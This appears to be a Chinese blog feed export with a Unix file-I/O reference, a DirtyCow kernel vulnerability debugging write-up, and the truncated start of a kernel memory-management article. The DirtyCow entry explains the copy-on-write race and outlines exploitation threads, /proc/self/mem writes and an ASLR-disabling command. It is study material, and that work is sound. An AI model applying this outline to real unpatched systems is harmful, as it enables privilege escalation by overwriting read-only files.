class="code"><pre><span class="line">EBADF 参数fd 非有效的文件描述词或该文件已关闭</span><br></pre></td></tr></table></figure><h3 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h3><p><code>wirte()</code>函数会把参数<code>buf</code>所指的内存写入<code>count</code>个字节到参数<code>fd</code>所指的文件内。当然，文件读写位置会随之移动</p><p>头文件：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>声明：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write</span> <span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> * buf, <span class="keyword">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure><p>返回值：如果成功执行会返回实际写入的字节数. 当有错误发生时则返回-1, 错误代码存入errno 中</p><p>Error Code：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EINTR 此调用被信号所中断</span><br><span class="line">EAGAIN 当使用不可阻断I&#x2F;O 时 (O_NONBLOCK), 若无数据可读取则返回此值.</span><br><span class="line">EADF 参数fd 非有效的文件描述词, 或该文件已关闭</span><br></pre></td></tr></table></figure><h3 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h3><p><code>read()</code>函数会把参数fd所指的文件传送<code>count</code>个字节到<code>buf</code>指针所指的内存中。若参数<code>count</code>为0，则<code>read()</code>不会有作用并返回0。返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或已无可读取的数据，此外文件读写位置会随读取到的字节移动。如果顺利<code>read()</code>会返回实际读取到的字节数，最好能够将返回值与参数<code>count</code>比较，若返回的字节数比要求读取的字节数少，则有可能读到了文件尾、从管道(pipe)或终端读的时候被信号中断了读取操作</p><p>头文件：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>声明：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> * buf, <span class="keyword">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure><p>返回值：当有错误发生时则返回-1, 错误代码存入errno 中, 而文件读写位置则无法预期</p><p>错误代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EINTR 此调用被信号所中断</span><br><span class="line">EAGAIN 当使用不可阻断I&#x2F;O 时(O_NONBLOCK), 若无数据可读取则返回此值</span><br><span class="line">EBADF 参数fd 非有效的文件描述词, 或该文件已关闭</span><br></pre></td></tr></table></figure><h3 id="lseek函数"><a href="#lseek函数" class="headerlink" title="lseek函数"></a>lseek函数</h3><p>每一个已打开的文件都有一个读写位置，当打开文件时通常其读写位置是指向文件开头，若是以附加的方式打开文件(如O_APPEND)，则读写位置会指向文件尾。当<code>read()</code>或<code>write()</code>时，读写位置会随之增加，<code>lseek()</code>便是用来控制该文件的读写位置。参数<code>fildes</code>为已打开的文件描述符，参数<code>offest</code>为根据参数<code>whence</code>来移动读写位置的位移数</p><blockquote><p>Linux系统不允许lseek()对tty装置作用，此项作用会令lseek()返回ESPIPE</p></blockquote><p>头文件：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>声明：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">off_t</span> <span class="title">lseek</span><span class="params">(<span class="keyword">int</span> fildes, <span class="keyword">off_t</span> offset, <span class="keyword">int</span> whence)</span></span>;</span><br></pre></td></tr></table></figure><p>参数</p><p><strong>whence</strong>：</p><ul><li>SEEK_SET：参数offset即为新的读写位置</li><li>SEEK_CUR：以目前的读写位置往后增加<code>offset</code>个位移量</li><li>SEEK_END：将读写位置指向文件尾后再增加<code>offset</code>个位移量。</li></ul><blockquote><p>当whence值为SEEK_CUR或SEEK_END时，参数offset允许负值的出现</p></blockquote><p>例：</p><ul><li>欲将读写位置移到文件开头时：lseek(int fildes,0,SEEK_SET)；</li><li>欲将读写位置移到文件末尾时：lseek(int fildes,0,SEEK_END)；</li><li>想要获取目前文件位置时：lseek(int fildes,0,SEEK_CUR)；</li></ul><p>返回值：当调用成功时则返回目前的读写位置，也就是距离文件开头多少个字节。若有错误则返回-1，errno会存放错误代码</p><h3 id="dup函数"><a href="#dup函数" class="headerlink" title="dup函数"></a>dup函数</h3><p><code>dup()</code>用来复制参数<code>oldfd</code>所指的文件描述符，并将它返回。此新的文件描述符和参数<code>oldfd</code>指的是同一个文件，共享所有锁定、读写位置和各项权限或旗标。例如，<strong>当利用lseek()对某个文件描述符作用时，另一个文件描述符的读写位置也会随之改变</strong>。不过文件描述符之间并不共享<code>close-on-exec</code>旗标</p><p>头文件：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>声明：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup</span> <span class="params">(<span class="keyword">int</span> oldfd)</span></span>;</span><br></pre></td></tr></table></figure><p>返回值：当复制成功时, 则返回最小及尚未使用的文件描述符. 若有错误则返回-1, errno 会存放错误代码.</p><p>Error Code:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EBADF 参数fd 非有效的文件描述词或该文件已关闭</span><br></pre></td></tr></table></figure><h3 id="dup2函数"><a href="#dup2函数" class="headerlink" title="dup2函数"></a>dup2函数</h3><p>dup2()用来复制参数<code>oldfd</code>所指的文件描述符，并将它拷贝至参数<code>newfd</code>后一块返回。若参数<code>newfd</code>为一已打开的文件描述符，则<code>newfd</code>所指向的文件会先被关闭。<code>dup2()</code>所复制的文件描述符，与原来的文件描述符共享各种文件状态(同dup)。<code>dup2()</code>相当于调用fcntl(oldfd,F_DUPFD,newfd)；</p><p>头文件：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>声明：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup2</span><span class="params">(<span class="keyword">int</span> odlfd, <span class="keyword">int</span> newfd)</span></span>;</span><br></pre></td></tr></table></figure><p>返回值：当复制成功时, 则返回最小及尚未使用的文件描述词. 若有错误则返回-1, errno 会存放错误代码.</p><p>Error Code:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EBADF 参数fd 非有效的文件描述词或该文件已关闭</span><br></pre></td></tr></table></figure><h3 id="fcntl函数"><a href="#fcntl函数" class="headerlink" title="fcntl函数"></a>fcntl函数</h3><p>头文件：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;   </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>声明：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fcntl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> cmd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fcntl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> cmd, <span class="keyword">long</span> arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fcntl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> cmd, struct flock * lock)</span></span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ol><li><strong>cmd</strong>：<ul><li>F_DUPFD：用来查找大于或等于参数<code>arg</code>的最小且仍未使用的文件描述符，并且复制参数<code>fd</code>的文件描述符。执行成功则返回新复制的文件描述符。请参考dup2(). - - F_GETFD 取得close-on-exec 旗标. 若此旗标的FD_CLOEXEC 位为0, 代表在调用exec()相关函数时文件将不会关闭</li></ul></li><li>F_SETFD：设置<code>close-on-exec</code>旗标. 该旗标以参数<code>arg</code>的FD_CLOEXEC位决定</li><li>F_GETFL：取得文件描述符状态旗帜</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;预备知识&quot;&gt;&lt;a href=&quot;#预备知识&quot; class=&quot;headerlink&quot; title=&quot;预备知识&quot;&gt;&lt;/a&gt;预备知识&lt;/h1&gt;&lt;h2 id=&quot;0x01文件相关&quot;&gt;&lt;a href=&quot;#0x01文件相关&quot; class=&quot;headerlink&quot; title=&quot;0
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="Unix" scheme="https://billyotry.github.io/tags/Unix/"/>
    
  </entry>
  
  <entry>
    <title>DirtyCow学习与调试记录</title>
    <link href="https://billyotry.github.io/2021/04/22/DirtyCow%E5%AD%A6%E4%B9%A0%E4%B8%8E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
    <id>https://billyotry.github.io/2021/04/22/DirtyCow%E5%AD%A6%E4%B9%A0%E4%B8%8E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/</id>
    <published>2021-04-22T03:18:18.973Z</published>
    <updated>2021-06-03T13:22:02.822Z</updated>
    
    <content type="html"><![CDATA[<p>其实网上关于脏牛的文章分析已经很多，本文算是对调试学习该漏洞过程的一个记录</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>写时拷贝</p><p>竞态条件</p><p>页式内存管理</p><p>缺页中断处理</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><strong>mmap函数</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mmap(<span class="keyword">void</span>* start, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot,<span class="keyword">int</span> flags,<span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span><br></pre></td></tr></table></figure><p>这个函数其实比较常用，它有一个很重要的用处就算将磁盘上的文件映射到虚拟内存中，对于这个函数唯一要说的就是当flags的MAP_PRIVATE被置为1时，对mmap得到内存映射进行的写操作会使内核触发COW操作，写的是COW后的内存，不会同步到磁盘的文件中</p><p><strong>madvice函数</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">madvice(<span class="keyword">caddr_t</span> addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> advice)</span><br></pre></td></tr></table></figure><p>这个函数的主要用处是告诉内核内存<code>addr~addr+len</code>在接下来的使用状况，以便内核进行一些进一步的内存管理操作。当advice为<code>MADV_DONTNEED</code>时，此系统调用相当于通知内核<code>addr~addr+len</code>的内存在接下来不再使用，内核将释放掉这一块内存以节省空间，相应的页表项也会被置空。</p><p><strong>write函数</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span>* buf, <span class="keyword">size_t</span> count)</span></span></span><br></pre></td></tr></table></figure><p>这个函数也是一个常见函数，主要作用就是向<strong>fd</strong>描述符所指向的文件写入<strong>buf</strong>中最多<strong>count</strong>长度的内容。</p><p><strong>mem文件</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/proc/self/mem</span><br></pre></td></tr></table></figure><p>该文件是一个指向当前进程的虚拟内存文件的文件，当前进程可以通过对这个文件进行读写以直接读写虚拟内存空间，并无视内存映射时的权限设置，也就是说我们可以利用写/proc/self/mem来改写不具有写权限的虚拟内存。可以这么做的原因是/proc/self/mem是一个文件，只要进程对该文件具有写权限，那就可以随便写这个文件，只不过对这个文件进行读写的时候需要一遍访问内存地址所需要的寻页的流程。因为这个文件指向的是虚拟内存。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>这里使用4.7.0的内核版本来复现</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13425912566/0" alt="image-20210418192715058"></p><p>在环境中有一个<code>run.sh</code>脚本来创建一个root用户，并且创建一个只读的文件<code>foo</code>，并且往其中写入<code>hello</code>的内容</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13425917007/0" alt="image-20210418192851450"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>对于COW中的写操作，我们调用<code>mem_write</code>函数来实现，下面就是该函数的调用链：</p><p><code>mem_write</code> -&gt; <code>mem_rw</code> -&gt; <code>access_remote_vm</code> -&gt; <code>__access_remote_vm</code></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13426017781/0" alt="image-20210418200415585"></p><p>首先我们看到<code>__access_remote_vm</code>函数中的这部分，如果是<code>write</code>操作，就执行拷贝数据到page页中，并且设置脏页的操作，这里我们关心的是它的<strong>page是如何获得的</strong>。我们关注下执行这个操作前的上面的<code>get_user_pages_remote</code>这个函数，这个函数就是<strong>获取接下来要写入数据的目标页</strong>。我们跟入这个函数分析，我们可以看到这个函数是对<code>__get_user_pages_locked</code>这个函数的封装，继续跟入到<code>__get_user_pages_locked</code>中。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13426074089/0" alt="image-20210418202228888"></p><p>可以如果是write的设置对应的flags位，接下来调用<code>__get_user_pages</code>函数，我们跟入这个函数中。由于代码量过大，我们只需要关注重点需要关注的地方，也就是下面一部分中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13426083389/0" alt="image-20210418202607803"></p><p>首先我们看到一个<code>cond_resched</code>函数，这个函数是一个线程调度的函数，正因为这个函数，才引入了我们条件竞争的可能。然后回调用<code>follow_page_mask</code>函数来获得一个<code>page</code>，如果没有正常返回一个<code>page</code>的话，就会调用<code>faultin_page</code>来进行缺页处理的操作。<code>follow_page_mask</code>简单来说就是一个一级目录，二级目录等到页表的这么一个寻找的过程。</p><p>因为多线程调试较麻烦，所以我们修改下exp，用一个阉割版的exp来调试，这里删除掉了<code>madvice</code>函数的操作。下图为多线程竞争的exp和阉割版的对比。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13426101892/0" alt="image-20210418203240944"></p><p>在阉割版exp中，在<code>worker_write</code>函数前面加入了一个<code>getchar</code>函数，相当于在触发COW操作前打了一个断点，方便我们调试。</p><p>首先这里我们先将地址随机化给关闭</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>我们使用阉割版的exp来调试看看我们的COW机制到底发生了什么。</p><h3 id="COW"><a href="#COW" class="headerlink" title="COW"></a>COW</h3><p>我们在<code>follow_pages_mask</code>函数前也就是<code>mm/gup.c:573</code>处下一个断点后，remote上qemu，然后运行我们的阉割版exp。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13427653286/0" alt="image-20210419105543151"></p><p>可以看到我们已经在<code>follow_pages_mask</code>函数前断了下来，这里我们重点关注当<strong>第一次调用<code>follow_pages_mask</code>的时候发生了什么</strong></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13427670747/0" alt="image-20210419105957836"></p><p>当我们执行完<code>follow_pages_mask</code>后，发现我们的<code>page</code>此时是0，并且我们没法访问我们映射的虚拟地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13428523277/0" alt="image-20210419144336968"></p><p>我们回到源码去看看这个0到底是如何返回的。我们直接看最后查找页表项的函数<code>follow_page_pte</code></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13428574979/0" alt="image-20210419145510499"></p><p>可以看到我们返回空是因为我们还没有给虚拟内存分配物理内存，所以跳到<code>no_page</code>，在<code>no_page</code>处就会调用<code>no_page_table</code>函数返回空。<strong>所以这里我们知道了第一次调用<code>follow_pages_mask</code>函数返回0的原因是因为我们的映射还是在虚拟内存中，并没有分配实际的物理内存，所以这里我们找不到page</strong>。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13428581430/0" alt="image-20210419145646323"></p><p>然后此时找不到<code>page</code>就会进入缺页处理函数<code>faultin_page</code>中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13428595181/0" alt="image-20210419150008012"></p><p>在上面的缺页处理函数中，我们可以看到这里有些进行错误标记的操作，就是比如说如果上面是因为没有写权限而来到了缺页处理函数，那么就会加上一个<code>FAULT_FLAG_WRITE</code>标记，其他也是同样道理。然后在下方主要通过<code>handle_mm_fault</code>函数来实现他的功能。此时，我们在这个函数下个断点来看下执行完缺页处理函数之后会发生什么。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13428632965/0" alt="image-20210419150815302"></p><p>可以看到此时我们的位置是在执行完了<code>handle_mm_fault</code>之后，然后我们可以看到刚刚映射的没法访问的地址，现在已经可以访问了，说明此时我们已经分配到了实际的物理内存，并且里面的内容是就是<code>foo</code>文件中的内容。我们再回到源码中看看<code>handle_mm_fault</code>函数到底做了什么，在<code>handle_mm_fault</code>函数中主要调用<code>__handle_mm_fault</code>来实现功能，我们继续跟入，在里面主要的就是调用了<code>handle_pte_fault</code>继续跟入。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13428679309/0" alt="image-20210419151751845"></p><p>这里因为没有分配实际的物理内存，所以我们会进入上面的if分支中，并且执行<code>do_fault</code></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13428695555/0" alt="image-20210419152200957"></p><p>这里我们之前已经设置好了要进行COW操作的标志，所以接下来就会调用<code>do_cow_fault</code>来进行一个COW副本页的分配。</p><p>我们继续执行第二次<code>follow_page_mask</code>函数的后，可以看到下图我们的物理内存已经分配了，但是我们的page还是0。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13428720515/0" alt="image-20210419152811260"></p><p>我们回到<code>follow_page_mask</code>中，继续进入到<code>follow_page_pte</code>中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13433043990/0" alt="image-20210419195234873"></p><p>我们可以知道此时我们已经分配了物理内存，所以最上面的if语句是不会进入的，我们看下面if 语句，就是判断内存是否具有写权限，如果没有的话，此时依旧是会返回空。我们前面说过了，我们要写的这个<code>foo</code>文件此时是只有读权限的，所以这里就能够解释为什么我们分配了实际的物理内存之后，在第二次调用<code>follow_page_mask</code>之后<code>page</code>依旧是会返回空。接下来我们看第二次进入缺页处理函数<code>faultin_page</code>的时候，它做了什么。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13430352709/0" alt="image-20210419210139492"></p><p>进入缺页处理函数，这里就会做一个标记，表示因为没有写权限而错误。做完了标记之后就会进入到<code>handle_mm_fault</code>处理函数中。此时的调用链依旧像刚刚一样<code>handle_mm_fault</code>-&gt; <code>__handle_mm_fault</code> -&gt;  <code>handle_pte_fault</code> </p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13430372964/0" alt="image-20210419210607400"></p><p>在<code>handle_pte_fault</code>函数中，我们就会在上图的位置中做一个检测，因为我们前面已经做了一个因为没有写全写而错误的标志，然后就会调用<code>do_wp_page</code>函数，这个函数前部分会判断是否已经通过COW分配到了一个副本页，然后会调用<code>wp_page_reuse</code>函数来使用上一步分配好的副本页，这个函数调用后会返回一个标志，如下图</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13430392556/0" alt="image-20210419211100737"></p><p>这个标志会作为<code>handle_mm_fault</code>的返回给ret，然后会去做一个操作，如下图</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13430397544/0" alt="image-20210419211225098"></p><p>这个操作就是去掉我们的<code>FOLL_WRITE</code>标志，我们知道我们第二次进入缺页处理函数的原因是我们没有写权限，也就是<code>FOLL_WRITE</code>这个标志导致我们出现错误，然后我们在第二次缺页处理的过程中，将这个标志去掉了。好了，我们接下来看第三次调用<code>follow_page_mask</code>函数会发生什么。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13430414595/0" alt="image-20210419211741998"></p><p>可以看到当我们执行完第三次后，我们成功返回了一个<code>page</code>，到此我们就完成了一个COW的流程。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>正常</strong>：</p><ul><li>第一次调用<code>follow_page_mask(FOLL_WRITE)</code>函数，因为<code>page</code>不在内存中，进行缺页处理</li><li>第二次调用<code>follow_page_mask(FOLL_WRITE)</code>函数，因为<code>page</code>不具有写权限，并去掉<code>FOLL_WRITE</code></li><li>第三次调用<code>follow_page_mask(无FOLL_WRITE)</code>函数，此时已经分配的真实的物理内存，并且无<code>FOLL_WRITE</code>，成功</li></ul><p><strong>POC</strong>：</p><ul><li>第一次调用<code>follow_page_mask(FOLL_WRITE)</code>函数，因为<code>page</code>不在内存中，进行缺页处理</li><li>第二次调用<code>follow_page_mask(FOLL_WRITE)</code>函数，因为<code>page</code>不具有写权限，并去掉<code>FOLL_WRITE</code></li><li>另一个线程释放上一步分配的COW页</li><li>第三次调用<code>follow_page_mask(无FOLL_WRITE)</code>函数，因为另一个线程释放了分配的页，所以<code>page</code>不在内存中，进行缺页处理</li><li>第四次调用<code>follow_page_mask(无FOLL_WRITE)</code>函数，成功返回page，但没有使用COW机制，此时因为没有使用COW机制，所以会影响到原文件。</li></ul><h3 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h3><ul><li><p>mmap函数的第四个参数指定映射的方式，包括map_shared和map_private，map_shared是指当多个线程将同一个文件映射到自己的虚拟地址中，它们共享同一物理内存块，而map_private则是将文件映射到进程的私有内存。这里重点讲解下map_private，这个参数指定将文件映射到进程的私有内存，假设此时有两个进程将同一文件映射到自己的虚拟内存地址，如果都是只读的，那么虚拟内存地址都将指向同一个物理内存块。如果一个进程试图写入数据，就会发生<strong>写时复制</strong>，将物理内存块复制一个副本，然后更新该进程的页表指向新的内存块，最后向物理内存块的副本中写入数据。</p><blockquote><p>这里要注意的是，即使程序是以只读的方式来做内存映射，map_private允许程序通过write系统调用往物理内存块的副本中写入数据，这其实也为我们的利用创造了条件</p></blockquote></li><li><p>madvise函数的第三个参数为MADV_DONOTNEED告诉内核不在需要声明地址部分的内存，内核将释放该地址的资源，<strong>进程的页表会重新指向原始的物理内存</strong>。</p></li></ul><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>首先一个进程将只读文件映射到进程的虚拟内存地址中，当mmap指定参数为<code>map_private</code>，尽管是只读的，仍然可以写入数据，只不过这时写到的是原始物理内存的副本。在写之前，会经历写时复制的三个过程，首先创建映射内存副本，然后更新页表，最后向副本写入数据。此时另一个线程在进行写时复制的进程的最后一步写入数据之前调用madvice()，那么进程的页表会重新指向原始的映射的内存物理块，那么此时进行写时复制的进程执行最后一部写入数据，此时写入的是原始内存，而不是副本中，那么就会只读文件写入数据。</p><h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>这里的基本思路就是在一个进程中创建两个线程，一个线程向只读的映射内存通过write系统调用写入数据，这时候发生写时复制，另一个线程通过madvice来丢弃映射的私有副本，两个线程相互竞争从而向只读文件写入数据。</p><h3 id="主线程"><a href="#主线程" class="headerlink" title="主线程"></a>主线程</h3><ul><li>普通用户身份以只读模式打开指定的只读文件</li><li>使用MAP_PRIVATE参数映射内存</li><li>找到目标文件映射的内存地址</li><li>创建两个线程</li></ul><h3 id="procselfmem线程"><a href="#procselfmem线程" class="headerlink" title="procselfmem线程"></a>procselfmem线程</h3><ul><li>向文件映射的内存区域写数据</li><li>此时内核采用COW机制</li></ul><h3 id="madvise线程"><a href="#madvise线程" class="headerlink" title="madvise线程"></a>madvise线程</h3><ul><li>使用MADV_DONTNEED参数调用madvise来释放文件映射内存区</li><li>干扰procselfmem线程的COW过程，产生竞争条件</li><li>当竞争条件发生时就能成功将数据写入文件</li></ul><p>下面是利用成功的截图</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13432983274/0" alt="image-20210420151228672"></p><p>可以看到我们已经将<code>foo</code>文件中的<code>hello</code>修改为了<code>hacku</code></p><p>如上，文章首发于安全客，转载请著名出处，文章链接</p><p><a href="https://www.anquanke.com/post/id/238669">https://www.anquanke.com/post/id/238669</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;其实网上关于脏牛的文章分析已经很多，本文算是对调试学习该漏洞过程的一个记录&lt;/p&gt;
&lt;h2 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h2&gt;&lt;p&gt;写时拷贝&lt;/p&gt;
&lt;p&gt;竞态条件&lt;
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="Linux" scheme="https://billyotry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核-内存管理学习</title>
    <link href="https://billyotry.github.io/2021/04/15/Linux%E5%86%85%E6%A0%B8-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
    <id>https://billyotry.github.io/2021/04/15/Linux%E5%86%85%E6%A0%B8-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-04-15T03:46:22.581Z</published>
    <updated>2021-04-22T11:19:23.090Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux内核对物理内存描述"><a href="#Linux内核对物理内存描述" class="headerlink" title="Linux内核对物理内存描述"></a>Linux内核对物理内存描述</h2><p>Linux将物理内存按固定大小的页面（一般为4K）划分内存，在内核初始化的时候，会建立一个<strong>全局struct page结构数组mem_map</strong>。数组中的每个元素与物理内存页面一一对应，整个数组就代表着系统中的全部物理页面。Linux将NUMA中内存访问速度一致的部分称为一个节点（Node），用<code>struct pglist_data</code>数据结构表示，通常使用时用它的typedef定义<code>pg_data_t</code>。系统中的每个节点都通过<code>pgdat_list</code>链表<code>pg_data_t -&gt; node_next</code>连接起来，该连接以NULL为结束标志。</p><p>每个节点又进一步分为许多块，称为区域（zones）。区域标识内存中的一块范围。区域用<code>struct zone_struct</code>数据结构表示，它的typedef定义为<code>zone_t</code>。</p><p>每个区域（zone）中有多个页面（Pages）组成。节点、区域、页面三者关系如下图：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13415667082/0" alt="image-20210416002829877"></p><h3 id="节点（Node）"><a href="#节点（Node）" class="headerlink" title="节点（Node）"></a>节点（Node）</h3><p>节点（Node），在linux中用<code>struct pglist_data</code>数据结构表示，通常使用时它的typedef定义<code>pg_data_t</code>，数据结构定义在文件<code>include/linux/mmzone.h</code>中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On NUMA machines, each NUMA node would have a pg_data_t to describe</span></span><br><span class="line"><span class="comment"> * it&#x27;s memory layout. On UMA machines there is a single pglist_data which</span></span><br><span class="line"><span class="comment"> * describes the whole memory.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Memory statistics and page replacement data structures are maintained on a</span></span><br><span class="line"><span class="comment"> * per-zone basis.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * node_zones contains just the zones for THIS node. Not all of the</span></span><br><span class="line"><span class="comment"> * zones may be populated, but it is the full list. It is referenced by</span></span><br><span class="line"><span class="comment"> * this node&#x27;s node_zonelists as well as other node&#x27;s node_zonelists.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这个节点的区域</span></span><br><span class="line">    <span class="comment">// 在x86中有 ZONE_HIGHMEM,ZONE_NORMAL,ZONE_DMA</span></span><br><span class="line">    <span class="comment">// 在X86_64中有 DMA,DMA32,NORMAL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * node_zonelists contains references to all zones in all nodes.</span></span><br><span class="line"><span class="comment"> * Generally the first zones will be references to this node&#x27;s</span></span><br><span class="line"><span class="comment"> * node_zones.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 分配区域时的顺序</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 区域的数量，一般来说值的范围为1~3，但并不是所有的节点都有三个区域</span></span><br><span class="line"><span class="keyword">int</span> nr_zones; <span class="comment">/* number of populated zones in this node */</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FLAT_NODE_MEM_MAP<span class="comment">/* means !SPARSEMEM */</span></span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 该节点的第一个页面在全局变量mem_map数组中的地址</span></span><br><span class="line"><span class="class"><span 